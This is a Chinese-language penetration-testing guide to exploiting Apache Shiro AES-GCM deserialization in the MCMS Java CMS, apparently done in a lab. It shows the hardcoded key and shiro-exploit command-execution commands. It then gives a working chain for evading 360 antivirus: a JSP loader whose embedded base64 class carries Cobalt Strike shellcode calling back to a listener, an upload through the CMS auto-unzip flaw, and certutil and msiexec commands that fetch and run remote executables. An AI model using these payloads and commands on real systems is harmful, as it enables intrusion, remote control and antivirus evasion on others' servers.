# shiro AES_GCM 反序列化

## 前置

新版本`Shiro(>=1.4.2)`采⽤了`AES-GCM`加密⽅式，导致旧版⼯具的加密算法⽆法正常利⽤漏洞 

如果知道**硬编码**的情况下可以利用

## 复现

cms 为 [MCMS: 好用开源的Java CMS 系统](https://gitee.com/mingSoft/MCMS#https://gitee.com/link?target=http%3A%2F%2Fa.cms.demo.mingsoft.net%2Fms%2Flogin.do)

### 登录后台

默认密码登录 cms 的后台，发现 `SHIRO_SESSION` 可能为新版的的 `shiro`

<img src=".\图片\Snipaste_2023-05-26_16-11-52.png" alt="Snipaste_2023-05-26_16-11-52" style="zoom:67%;" />

### 找到硬编码

白盒手动找到硬编码，`application.yml` 里：

```yml
shiro-key: d3d3bWluZ3NvZnRuZXRtcw== #生产必须修改此值否则会存在安全风险，可以通过 https://base64.us/随机生产一个Base64值
```

### 工具利用

#### 一

勾上 `aes gsm` 使⽤即可

<img src=".\图片\Snipaste_2023-05-26_16-19-50.png" alt="Snipaste_2023-05-26_16-19-50" style="zoom:67%;" />

#### 二

 https://github.com/Ares-X/shiro-exploit

脚本⾃带⼀些硬编码，这⾥是知道硬编码的。所以把编码加进⾏就可以了。

1、检测硬编码，2 是 gsm加密⽅式

```bash
python shiro-exploit.py check -u http://192.168.0.115:8080/ms-mcms/ms/index.do -v 2
```

<img src=".\图片\Snipaste_2023-05-26_16-28-36.png" alt="Snipaste_2023-05-26_16-28-36" style="zoom:80%;" />

2、dnslog检测

```bash
python shiro-exploit.py yso -g URLDNS -c "http://moonsec.03d3fu.dnslog.cn" -k d3d3bWluZ3NvZnRuZXRtcw== -u http://192.168.0.115:8080/ms-mcms/ms/login.do -v 2
```

3、命令执⾏

命令执⾏ shiro⼀般使⽤ CommonsBeanutils1 这⽆依赖链⼦

```bash
python shiro-exploit.py echo -g CommonsBeanutils1 -u http://192.168.0.115:8080/ms-mcms/ms/index.do -v 2 -k d3d3bWluZ3NvZnRuZXRtcw== -c whoami
```

360 拦截了

<img src=".\图片\Snipaste_2023-05-26_16-32-54.png" alt="Snipaste_2023-05-26_16-32-54" style="zoom:80%;" />

手动允许，便可以执行命令

<img src=".\图片\Snipaste_2023-05-26_16-33-31.png" alt="Snipaste_2023-05-26_16-33-31" style="zoom:80%;" />

# shiro 反序列化绕 360

## 前置

杀软在线查询，存在 360 

<img src=".\图片\Snipaste_2023-05-26_16-38-27.png" alt="Snipaste_2023-05-26_16-38-27" style="zoom:67%;" />

执行一般下载命令会被拦截

<img src=".\图片\Snipaste_2023-05-26_16-40-49.png" alt="Snipaste_2023-05-26_16-40-49" style="zoom:80%;" />

## 思路

- jsp加载shellcode上线cs 
- 因为这套cms后存在**自动解压漏洞**，将jsp后缀的⽂件打包zip上传⾃动解压在当前⽬录
-  所以可以使⽤ jsp 加载 shellcode上线cs 
- 使⽤cs⽣成 java shellcode 再使⽤base64编码

## 步骤

1、cs 生成 shellcode，把 shellcode 来 `bufToString`：

```java
import java.util.Arrays;

public class bufToString {
    public static void main(String[] args) {
        /* length: 892 bytes */
        byte buf[] = new byte[] { (byte)0xfc, (byte)0x48.......};

               System.out.println(Arrays.toString(buf));
    }
}
```

2、生成恶意类，注意路径得为 `sun/tools/attach/WindowsVirtualMachine.java`

```java
package sun.tools.attach;

import java.io.IOException;
public class WindowsVirtualMachine {
    public WindowsVirtualMachine() {
    }
    static native void enqueue(long var0, byte[] var2, String var3, String var4, Object... var5) throws IOException;
    static native long openProcess(int var0) throws IOException;
    public static void run(byte[] buf) {
        System.loadLibrary("attach");
        buf = new byte[] {-4, 72...........};
        try {
            enqueue(-1L, buf, "test", "test");
        } catch (Exception var2) {
            var2.printStackTrace();
        }
    }
}
```

3、⽤⾃定义类加载器加载 shellcode

- ClassToBase64，把恶意类 `WindowsVirtualMachine.java` 转化成 base64

  ```java
  import java.io.File;
  import java.io.FileInputStream;
  import java.io.IOException;
  import java.util.Base64;
  
  public class ClassToBase64 {
      public static void main(String[] args)
      {
          try {
              File file = new File("E:\\渗透笔记\\Java\\Project\\redteam\\target\\classes\\sun\\tools\\attach\\WindowsVirtualMachine.class");
              FileInputStream fi = new FileInputStream(file);
              byte[] buffer = new byte[(int) file.length()];
              int offset = 0;
              int numRead = 0;
              while (offset < buffer.length
                      && (numRead = fi.read(buffer, offset, buffer.length - offset)) >= 0) {
                  offset += numRead;
              }
              if (offset != buffer.length) {
                  throw new IOException("Could not completely read file " + file.getName());
              }
              fi.close();
              String encoded = Base64.getEncoder().encodeToString(buffer);
              System.out.println(encoded);
          } catch (Exception e) {
              e.printStackTrace();
          }
      }
  }
  ```

- 使⽤⾃定义类加载器加载shellcode

```java
import java.lang.reflect.Method;
import java.util.Base64;
public class LoadShellcode {
    public static class Myloader extends ClassLoader
    {
        public Class get(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
    public static void main(String[] args)
    {
        try {
            //calc
            String classStr="yv66vgAAADQAMg......";
            Class result = new Myloader().get(Base64.getDecoder().decode(classStr));
            for (Method m:result.getDeclaredMethods())
            {
                System.out.println(m.getName());
                if (m.getName().equals("run"))
                {
                    m.invoke(result,new byte[]{});
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

本机手动测试上线

<img src=".\图片\Snipaste_2023-05-26_17-15-16.png" alt="Snipaste_2023-05-26_17-15-16" style="zoom:80%;" />

4、把 `LoadShellcode` 有 java 转化成 jsp（这里的payload是上线cs的 192.168.0.103:1234 http 的监听器）

```jsp
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.util.Base64"%>
<%!
    public static class Myloader extends ClassLoader
    {
        public Class get(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
%>
<%
    try {
        String classStr="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";
        Class result = new Myloader().get(Base64.getDecoder().decode(classStr));
        for (Method m:result.getDeclaredMethods())
        {
            System.out.println(m.getName());
            if (m.getName().equals("run"))
            {
                m.invoke(result,new byte[]{});
            }
        }
    } catch (Exception e) {
        e.printStackTrace();
    }
%>
```

5、由该cms的自解压漏洞上传如上生成的恶意 jsp，访问便上线了 

执行后最好再**注入进程**里，不然⽹站会崩坏。再把当前的shellcode结束即可

# 绕过360卫士执行命令

## 思路一

网站无 java 的情况下，使用以下命令尝试，不行的话就不行

```bash
Certutil & Certutil –urlcache –f –split http://192.168.0.149/python3.exe
Certutil | Certutil –urlcache –f –split http://192.168.0.149/python3.exe
certutil|certutil -urlcache split -f http://xxx.com/dns.exe
copy c:\windows\system32\certutil.exe c.exe
c -urlcache -split -f http://xxx.com/dns.exe
msiexec /q /i http://192.168.0.120:81/cmd.png
```

## 思路二

网站有 java 的情况下，由以上的方法，由自定义类加载器（如以上的LoadShellcode类）把恶意类打包成 jar

 再运行 jar 即可

```bash
java -jar shellcode.jar
```

































































































































































































































































































